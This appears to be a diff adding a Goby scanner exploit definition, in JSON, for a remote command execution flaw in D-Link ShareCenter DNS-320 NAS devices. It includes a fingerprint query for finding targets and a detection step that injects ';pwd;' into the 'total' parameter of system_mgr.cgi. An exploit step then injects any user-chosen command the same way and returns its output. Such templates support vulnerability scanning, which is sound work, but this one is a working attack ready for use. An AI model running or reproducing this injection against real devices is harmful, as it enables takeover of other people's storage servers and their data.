@@ -1,0 +1,98 @@
+{
+      "Name": "D-Link ShareCenter DNS-320 RCE",
+      "Level": "3",
+      "Tags": [
+            "RCE"
+      ],
+      "GobyQuery": "app=\"D_Link-DNS-ShareCenter\"",
+      "Description": "D-Link ShareCenter DNS-320 system_mgr.cgi 存在远程命令执行，攻击者通过漏洞可以控制服务器",
+      "Product": "",
+      "Homepage": "https://gobies.org/",
+      "Author": "gobysec@gmail.com",
+      "Impact": "",
+      "Recommandation": "<p>undefined</p>",
+      "References": [
+            "https://gobies.org/"
+      ],
+	  "HasExp": true,
+	  "ExpParams": [
+		{
+			"name": "Cmd",
+			"type": "input",
+			"value": "ls",
+			"show": ""
+		}
+	  ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/cgi-bin/system_mgr.cgi?cmd=cgi_get_log_item&total=;pwd;",
+                        "follow_redirect": false,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "var/www",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+	  "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/cgi-bin/system_mgr.cgi?cmd=cgi_get_log_item&total=;{{{Cmd}}};",
+                        "follow_redirect": false,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "var/www",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+					"output|lastbody"
+				  ]
+            }
+      ],
+      "PostTime": "2021-06-09 19:00:34",
+      "GobyVersion": "1.8.268"
+}
